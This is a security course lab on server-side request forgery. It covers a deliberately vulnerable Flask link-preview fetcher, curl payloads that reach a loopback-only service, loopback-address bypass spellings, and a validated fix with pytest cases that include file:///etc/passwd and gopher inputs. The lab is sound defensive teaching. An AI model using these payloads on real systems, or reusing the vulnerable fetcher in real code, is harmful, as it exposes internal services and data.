---
title: "LAB-304-03 · Server-Side Request Forgery"
description: "Make a server fetch a loopback-only service you cannot reach yourself, then close the hole with post-resolution validation."
module_code: CYB-304
level: 3
kind: lab
prerequisites: [CYB-304]
estimated_minutes: 105
difficulty: advanced
safety: isolated-vm
lab_ids: [LAB-304-03]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [ssrf, allowlist, dns, egress, flask]
---

# LAB-304-03 · Server-Side Request Forgery

## Scenario and background

A link-preview feature takes a URL and returns a summary. The feature runs on the same host as an internal
diagnostics service that listens only on `127.0.0.1` — the assumption being that "loopback is not reachable from
outside". That assumption is true for you, sitting at `lab-analyst`. It is false for the application, which is
already inside.

You will build both services, prove that the preview endpoint reaches what you cannot, and then implement the
validation that stops it. This is the most sensitive lab in Level 3, and its rules are narrow on purpose.

## Learning objectives

By the end of this lab you can:

1. Explain the network-position difference between the attacker and the server.
2. Demonstrate in-band SSRF against a service bound to loopback.
3. Explain why a hostname allowlist checked before resolution is bypassable.
4. Implement scheme, port, resolution, and redirect controls, and test each.
5. State the residual risk that remains after the fix (DNS rebinding, connect-time changes).

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| Python 3 | 3.10+ | Both services |
| Flask, `requests` | Flask 3.x, requests 2.31+ | Fetcher and internal service |
| `curl`, `ss` | standard | Requests and binding checks |
| `pytest` | 7.x | Regression tests |

!!! warning "Authorized scope — read before you begin"
    **Targets you may use, and only these:** `http://127.0.0.1:9000` (the internal service you start) and
    `http://192.0.2.30` (your own lab host). Nothing else.

    **Explicitly forbidden in this lab:**
    - `169.254.169.254` or any other cloud metadata address, in any encoding.
    - Any address outside `192.0.2.0/24` and loopback on your own VM.
    - Any hostname you do not control.
    - Any "port scan through the fetcher" exercise beyond the two ports named here.

    SSRF is the one flaw in this course that can reach a real control plane from a lab. A successful request to a
    metadata endpoint can return live credentials; that is not a learning outcome, it is an incident. If you find
    yourself constructing an address to see whether it is blocked, stop — blocked or not, it is out of scope.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model

The adversary can set the `url` parameter of a preview endpoint. They cannot reach the internal service
themselves. The application can. The data returned is synthetic: the internal service serves a fixed fake token so
that the demonstration has a visible payload without creating a real secret.

**Impact if exploited.** An unauthenticated client can make the server issue requests from its own network
position, reaching loopback and internal services that are not exposed to the network, and read their responses
through the preview body.

## Environment

| Host | Role | Address |
| --- | --- | --- |
| `lab-analyst` | Client | 192.0.2.10 |
| `lab-web` | Fetcher (public) + internal service (loopback only) | 192.0.2.30 |

```text
lab-analyst 192.0.2.10
      │  can reach :5006
      ▼
lab-web 192.0.2.30:5006  fetcher  ──►  127.0.0.1:9000  internal service
      ▲                                    (loopback only)
      │  cannot reach :9000 directly
      └── lab-analyst
```

## Before you start

1. Snapshot `pre-lab-304-03`.
2. On `lab-web`, attach NAT temporarily and install the dependencies:

   ```bash
   sudo apt update && sudo apt install -y python3-venv
   python3 -m venv ~/ssrf-lab && . ~/ssrf-lab/bin/activate
   pip install flask requests pytest
   ```

   Detach NAT afterwards and confirm `ping -c1 -W1 8.8.8.8` fails.

3. Create `~/ssrf-lab/{evidence,internal}` on `lab-web`.

## Procedure

### 1. Build the internal service

```bash
cd ~/ssrf-lab
cat > internal_only.py <<'PY'
"""Internal diagnostics service. Loopback only. Serves synthetic data."""
from flask import Flask, jsonify
app = Flask(__name__)

@app.get("/internal/health")
def health():
    return jsonify(status="ok", service="diagnostics", env="lab")

@app.get("/internal/token")
def token():
    # SYNTHETIC. Not a credential, not valid anywhere.
    return jsonify(token="LAB-FAKE-TOKEN-304-03", scope="internal-only")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=9000)
PY

. ~/ssrf-lab/bin/activate
nohup python internal_only.py > evidence/internal.log 2>&1 &
sleep 2
ss -tlnp | grep 9000
curl -sS http://127.0.0.1:9000/internal/health
```

**Expected:** a listener on `127.0.0.1:9000`, and a JSON health response. Note the binding: loopback only.

### 2. Build the vulnerable fetcher

```bash
cat > fetcher.py <<'PY'
"""Deliberately vulnerable link preview: fetches any URL it is given."""
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.get("/preview")
def preview():
    url = request.args.get("url", "")
    try:
        r = requests.get(url, timeout=4)
        return jsonify(status=r.status_code, body=r.text[:2000])
    except Exception as e:
        return jsonify(error=str(e)), 502

if __name__ == "__main__":
    app.run(host="192.0.2.30", port=5006)
PY

nohup python fetcher.py > evidence/fetcher.log 2>&1 &
sleep 2
ss -tlnp | grep 5006
```

**Expected:** the fetcher listens on `192.0.2.30:5006` and is reachable from `lab-analyst`.

**Why bind to the lab address:** the fetcher is meant to be a public feature of the application, reachable from the
lab network. The internal service is not. That difference is the whole scenario.

### 3. Prove the boundary exists

From `lab-analyst`, try to reach the internal service directly:

```bash
curl -sS --max-time 3 http://192.0.2.30:9000/internal/token; echo "exit=$?"
```

**Expected:** connection refused or timeout — the service is not listening on `192.0.2.30`. Record the failure. You
now have the "before" half of the finding.

### 4. Cross the boundary through the fetcher

```bash
curl -sS -G 'http://192.0.2.30:5006/preview' \
  --data-urlencode 'url=http://127.0.0.1:9000/internal/token' | tee evidence/ssrf-token.json
```

**Expected:** a `200` whose `body` field contains `LAB-FAKE-TOKEN-304-03`. The fetcher reached a service you cannot
reach, because the request originated on the server.

**This is the finding, stated precisely:** the preview feature lets an unauthenticated client make the server issue
arbitrary HTTP GET requests, including to loopback services that are not exposed to the network.

Also confirm the feature works legitimately, so the fix does not break it:

```bash
curl -sS -G 'http://192.0.2.30:5006/preview' \
  --data-urlencode 'url=http://192.0.2.30:4280/login.php' | head -c 200; echo
```

**Expected:** DVWA's login page inside the `body` field. That is the behaviour to preserve.

### 5. See what a naive check would miss

The obvious fix is "block strings containing `127.0.0.1` and `localhost`". Test the shapes that defeat it, using
**only** the two addresses permitted in this lab:

| Shape | Why a string check misses it | Permitted here? |
| --- | --- | --- |
| `http://127.1:9000/...` | Short form of the same address | Yes — loopback |
| `http://[::1]:9000/...` | IPv6 loopback, no match for `127.0.0.1` | Yes — loopback |
| `http://[::ffff:127.0.0.1]:9000/...` | IPv4-mapped IPv6 | Yes — loopback |
| `http://2130706433:9000/...` | Decimal integer form | Yes — loopback, resolves on some stacks |
| `http://127.0.0.1.nip.io:9000/...` | Public DNS name resolving to loopback | **No** — uses a third-party resolver; skip |
| Redirect from an allowed host to `127.0.0.1` | Check happens on the first URL only | Only if you can serve the redirect; optional |

Run the permitted ones and record which the fetcher accepts:

```bash
for u in 'http://127.1:9000/internal/token' \
         'http://[::1]:9000/internal/token' \
         'http://[::ffff:127.0.0.1]:9000/internal/token'; do
  printf '%-42s ' "$u"
  curl -sS -G 'http://192.0.2.30:5006/preview' --data-urlencode "url=$u" | head -c 80; echo
done | tee evidence/ssrf-variants.txt
```

**Expected:** several variants succeed, each with a different spelling of the same address. **This is why the fix
must be an allowlist evaluated after resolution**, not a denylist of strings.

### 6. Build the fix

```bash
mkdir -p ~/ssrf-lab/fixed/tests && cd ~/ssrf-lab/fixed
cat > safe_fetch.py <<'PY'
"""Preview fetcher restricted to one lab network, validated after resolution."""
import ipaddress, socket
from urllib.parse import urlparse
import requests

ALLOWED_NET = ipaddress.ip_network("192.0.2.0/24")
ALLOWED_SCHEMES = {"http", "https"}
MAX_BYTES = 512 * 1024

def validate(url: str) -> None:
    p = urlparse(url)
    if p.scheme not in ALLOWED_SCHEMES:
        raise ValueError("scheme not permitted")
    if not p.hostname:
        raise ValueError("host required")
    port = p.port or (443 if p.scheme == "https" else 80)

    infos = socket.getaddrinfo(p.hostname, port, proto=socket.IPPROTO_TCP)
    if not infos:
        raise ValueError("host did not resolve")
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped
        if ip not in ALLOWED_NET:
            raise ValueError(f"address not permitted: {ip}")

def fetch(url: str) -> requests.Response:
    validate(url)
    # Redirects off: a permitted host must not be able to bounce us elsewhere.
    return requests.get(url, timeout=4, allow_redirects=False, stream=True)
PY

cat > tests/test_ssrf.py <<'PY'
import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
import pytest
import safe_fetch

@pytest.mark.parametrize("url", [
    "http://127.0.0.1:9000/internal/token",
    "http://127.1:9000/internal/token",
    "http://[::1]:9000/internal/token",
    "http://[::ffff:127.0.0.1]:9000/internal/token",
    "http://localhost:9000/internal/token",
])
def test_loopback_is_refused(url):
    with pytest.raises(ValueError):
        safe_fetch.validate(url)

@pytest.mark.parametrize("url", [
    "file:///etc/passwd",
    "gopher://192.0.2.30:70/_x",
    "ftp://192.0.2.30/x",
])
def test_non_http_schemes_refused(url):
    with pytest.raises(ValueError):
        safe_fetch.validate(url)

def test_lab_host_is_allowed():
    safe_fetch.validate("http://192.0.2.30:4280/login.php")   # must not raise

def test_public_address_is_refused():
    with pytest.raises(ValueError):
        safe_fetch.validate("http://203.0.113.10/")

def test_redirects_are_disabled(monkeypatch):
    seen = {}
    def fake_get(url, **kw):
        seen.update(kw); return object()
    monkeypatch.setattr(safe_fetch.requests, "get", fake_get)
    safe_fetch.fetch("http://192.0.2.30:4280/login.php")
    assert seen["allow_redirects"] is False
PY

python3 -m venv .venv && . .venv/bin/activate
pip install flask requests pytest
python -m pytest -q
```

**Expected:** eleven passing tests.

**Why `validate` is a separate function:** it is the security decision, and it is testable without a network. The
`fetch` wrapper is plumbing. Keeping them apart is what makes the tests fast and honest.

### 7. Verify live, then compare

Replace the fetcher's `requests.get` with `safe_fetch.fetch` and restart, or add a `/preview-safe` route that uses
it. Then:

```bash
for u in 'http://127.0.0.1:9000/internal/token' 'http://192.0.2.30:4280/login.php'; do
  printf '%-46s ' "$u"
  curl -sS -o /dev/null -w '%{http_code}\n' -G 'http://192.0.2.30:5006/preview-safe' --data-urlencode "url=$u"
done
```

**Expected:** `400` for loopback, `200` for the lab host. The feature still works; the boundary holds.

### 8. Write the finding

In `evidence/ssrf-finding.md`: the endpoint, the request, the internal response (redact the fake token if you
prefer, it is synthetic), the direct-access failure that proves the network-position difference, the variants that
defeated a string denylist, the fix, and the **residual risk**: between validation and connection, DNS can change;
closing that needs connecting to the validated IP or an egress proxy.

## Evidence to collect

- `evidence/ssrf-token.json` — the internal response obtained through the fetcher.
- `evidence/direct-access.txt` — the failed direct attempt.
- `evidence/ssrf-variants.txt` — the loopback spellings and their results.
- `fixed/` with `safe_fetch.py` and `tests/`; `evidence/pytest.txt`; `evidence/live-safe.txt`.
- `evidence/ssrf-finding.md`, including the residual-risk paragraph.

## Verification

- [ ] Internal service bound to `127.0.0.1:9000`; binding shown with `ss`.
- [ ] Direct access from `lab-analyst` failed and the failure is recorded.
- [ ] The fetcher returned the internal token, proving in-band SSRF.
- [ ] The legitimate preview of `192.0.2.30:4280` still works.
- [ ] Three loopback variants tested; results recorded.
- [ ] Eleven tests pass; live check returns `400` and `200`.
- [ ] No request was made to any metadata address or any host outside the lab.

## Teardown and reset

```bash
# Stop both services on lab-web
pkill -f internal_only.py
pkill -f fetcher.py
ss -tlnp | grep -E '9000|5006' || echo "both stopped"
```

Remove `~/ssrf-lab` if you do not need the evidence, and revert `pre-lab-304-03`. Confirm the internal service is
no longer running — an abandoned loopback service is exactly the kind of thing a later lab stumbles into.

## Reflection

1. The internal service was "unreachable" and the fetcher reached it. State the security assumption that was wrong,
   in one sentence.
2. Your fix resolves the hostname and checks the address. Describe the window that remains, and the two designs
   that close it.
3. Why is `allow_redirects=False` part of the control rather than a convenience?
4. A colleague proposes blocking the string `169.254.169.254`. Give two reasons that is insufficient, without
   naming any other address.

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Demonstration | Described only | Internal service reached through fetcher | Reached, plus the direct-access failure that proves the position difference |
| Bypass analysis | Denylist assumed sufficient | Variants tested | Variants tested and the resolution-order principle stated |
| Fix | String blocklist | Allowlist after resolution | Allowlist, redirects off, scheme and port checks, IPv4-mapped handling |
| Residual risk | Not mentioned | Mentioned | Explained with the specific window and the design that closes it |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Fetcher refuses to start on `192.0.2.30` | Address not present on the VM | Check `ip -brief addr`; bind to the address the VM actually has |
| `curl` to `:5006` times out from analyst | Host-only network mismatch | Verify both VMs are on the same host-only segment |
| Internal service reachable directly | It was started with `host="0.0.0.0"` | Stop it and bind `127.0.0.1` — this is the point of the lab |
| Fetcher returns `502` with a DNS error | Name does not resolve | Use IP literals only, as the lab does |
| IPv6 variant fails to connect | IPv6 disabled in the VM | Record it as an environment limitation; the validation test still applies |
| `getaddrinfo` raises for `127.1` | Platform resolver strictness | Record the result; the shortened form is resolver-dependent |

## References

1. OWASP Server-Side Request Forgery Prevention Cheat Sheet. Accessed 2026-10-29.
2. OWASP WSTG v4.2 — WSTG-CONF-08 (Application Architecture), and the SSRF material in the business-logic section.
3. OWASP Top 10:2025 — A01 Broken Access Control. <https://owasp.org/Top10/2025/>
4. Python `ipaddress` — `ipv4_mapped`, `ip_network` containment. Accessed 2026-10-29.
